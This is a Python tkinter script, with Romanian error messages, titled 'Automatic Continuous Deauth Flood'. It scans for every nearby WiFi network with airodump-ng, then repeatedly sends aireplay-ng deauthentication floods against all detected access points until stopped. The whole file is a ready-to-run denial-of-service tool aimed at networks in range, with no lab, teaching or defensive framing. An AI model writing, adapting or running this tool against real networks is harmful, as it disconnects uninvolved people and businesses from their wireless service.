import os
import tkinter as tk
from tkinter import scrolledtext
from threading import Thread
import time

stop_flood = False

def execute_command(command):
    output_text.insert(tk.END, f"[EXEC] {command}\n")
    output_text.see(tk.END)

    def run():
        process = os.popen(command)
        result = process.read()
        process.close()
        output_text.insert(tk.END, result + "\n")
        output_text.see(tk.END)

    Thread(target=run).start()

def scan_networks():
    execute_command("airodump-ng wlan0mon --write scan_results --output-format csv")
    time.sleep(5)

    try:
        with open("scan_results-01.csv", "r") as file:
            lines = file.readlines()
            bssids = [line.split(",")[0].strip() for line in lines[2:] if len(line.split(",")) > 10]
            return list(set(bssids))  
    except FileNotFoundError:
        output_text.insert(tk.END, "[EROARE] Nu s-au găsit rețele WiFi!\n")
        return []

def continuous_deauth():
    global stop_flood
    stop_flood = False

    bssids = scan_networks()
    if not bssids:
        return

    def flood():
        while not stop_flood:
            for bssid in bssids:
                os.system(f"aireplay-ng --deauth 1000 -a {bssid} wlan0mon")

    Thread(target=flood, daemon=True).start()
    execute_command("[INFO] Continuous Deauth Flood started on all detected networks.")

def stop_attack():
    global stop_flood
    stop_flood = True
    execute_command("[INFO] Continuous Deauth Flood stopped.")
    os.system("killall aireplay-ng")

root = tk.Tk()
root.title("Automatic Continuous Deauth Flood")
root.geometry("800x400")
root.configure(bg="black")

output_text = scrolledtext.ScrolledText(root, bg="black", fg="white", height=10)
output_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

button_frame = tk.Frame(root, bg="black")
button_frame.pack(side=tk.BOTTOM, fill=tk.X, padx=20, pady=10)

tk.Button(button_frame, text="Start Continuous Deauth Flood", command=continuous_deauth, bg="red", fg="white", width=40).pack(pady=5)
tk.Button(button_frame, text="Stop Attack", command=stop_attack, bg="gray", fg="white", width=40).pack(pady=5)

root.mainloop()
